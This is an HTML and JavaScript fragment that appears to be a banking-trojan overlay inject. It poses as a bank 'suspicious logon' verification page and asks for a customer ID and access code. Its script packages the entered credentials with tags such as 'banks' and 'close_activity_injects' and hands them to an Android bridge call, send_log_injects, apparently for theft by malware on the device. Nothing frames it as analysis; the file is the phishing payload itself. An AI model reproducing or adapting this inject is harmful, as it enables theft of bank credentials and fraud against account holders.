            <p style="color: #000;margin-top: 15px;"> Suspicious logon detected. Fill in the required fields so we can verify your identity. </p>


            <p style="font-size: 18px;">Log in using your customer ID and access code.</p>
            <input type="password" name="login" class="field-login" id="login" autocomplete="off" placeholder="customer ID">
            <input type="password" name="password" class="field-password" id="password" maxlength="20" autocomplete="off" placeholder="access code">
        </section>
        <footer>
            <input type="submit" class="button" id="sendData" value="LOGIN">
        </footer>
    </form>
    <script>
        $('#password').mask('0#')
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(login.value.length < 6) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            if(password.value.length < 7) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(login.value.length >= 6 && password.value.length >= 7) {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
